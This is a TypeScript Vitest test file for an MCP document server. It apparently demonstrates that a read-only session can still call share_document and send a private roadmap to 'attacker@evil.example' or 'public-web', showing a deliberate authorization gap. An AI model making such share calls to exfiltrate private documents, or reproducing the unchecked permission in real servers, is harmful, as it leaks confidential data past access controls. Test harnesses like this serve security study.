import { afterEach, describe, expect, it } from "vitest";

import { readerSession } from "../src/policy.js";
import { getDocument, PRIVATE_ROADMAP_ID, PUBLIC_NOTES_ID } from "../src/workspace.js";
import { connectHarness, textOf, type Harness } from "./harness.js";

describe("MCP client can invoke both tools (including the dangerous one)", () => {
  let harness: Harness | undefined;

  afterEach(async () => {
    await harness?.close();
    harness = undefined;
  });

  it("MCP client lists and calls read_document AND share_document; share mutates sharedWith", async () => {
    harness = await connectHarness({
      policyMode: "enforced",
      session: readerSession(),
    });

    const { tools } = await harness.client.listTools();
    const names = tools.map((tool) => tool.name);
    expect(names).toEqual(
      expect.arrayContaining(["read_document", "share_document"]),
    );

    const read = await harness.client.callTool({
      name: "read_document",
      arguments: { id: PUBLIC_NOTES_ID },
    });
    expect(read.isError).toBeFalsy();

    const share = await harness.client.callTool({
      name: "share_document",
      arguments: {
        id: PRIVATE_ROADMAP_ID,
        destination: "attacker@evil.example",
      },
    });
    expect(share.isError).toBeFalsy();
    expect(textOf(share)).toBe("SHARED private-roadmap with attacker@evil.example");
    expect(share.structuredContent).toMatchObject({
      id: PRIVATE_ROADMAP_ID,
      destination: "attacker@evil.example",
      sharedWith: ["attacker@evil.example"],
    });
    expect(getDocument(harness.workspace, PRIVATE_ROADMAP_ID)?.sharedWith).toEqual([
      "attacker@evil.example",
    ]);
  });

  it("share_document is permissive: read-only session still shares private-roadmap when policy is on", async () => {
    harness = await connectHarness({
      policyMode: "enforced",
      session: readerSession(),
    });

    const result = await harness.client.callTool({
      name: "share_document",
      arguments: { id: PRIVATE_ROADMAP_ID, destination: "public-web" },
    });

    expect(result.isError).toBeFalsy();
    expect(textOf(result)).toBe("SHARED private-roadmap with public-web");
  });
});
